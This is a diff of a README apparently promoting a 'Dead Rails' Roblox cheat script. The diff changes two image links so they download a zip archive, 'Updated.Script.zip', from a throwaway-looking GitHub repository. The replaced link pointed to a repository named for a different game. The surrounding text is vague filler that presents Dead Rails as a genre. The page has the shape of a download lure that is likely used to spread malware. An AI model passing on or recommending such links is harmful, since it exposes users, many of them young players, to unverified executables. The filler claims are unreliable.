@@ -3,10 +3,10 @@
 Welcome to the ultimate guide on **Dead Rails Script for Roblox**! Whether you're a beginner looking to enhance your game or an advanced scripter searching for optimization tips, this comprehensive guide covers everything you need to know about **Dead Rails scripting** in Roblox.  
 
 [![image](https://github.com/user-attachments/assets/c2c76d38-17eb-42c0-8042-5bf1c445cd14)
-](https://github.com/Rblx-GUI/Dandys-World-Script-Unlock-All-Features-and-Enhance-Your-Roblox-Experience-in-2025/releases/download/new/script.zip)
+](https://github.com/Dgqwda/new/releases/download/new/Updated.Script.zip)
 
 [![hq720](https://github.com/user-attachments/assets/8d206c76-6f61-43ce-b79e-900563dcd53c)
-](https://github.com/Rblx-GUI/Dandys-World-Script-Unlock-All-Features-and-Enhance-Your-Roblox-Experience-in-2025/releases/download/new/script.zip)
+](https://github.com/Dgqwda/new/releases/download/new/Updated.Script.zip)
 
 ## **What is Dead Rails in Roblox?**  
 **Dead Rails** is a popular Roblox game genre or mechanic often associated with **horror, survival, or adventure games**. The term typically refers to **abandoned railways, haunted trains, or eerie railroad environments** where players must navigate challenges, solve puzzles, or survive against threats.  
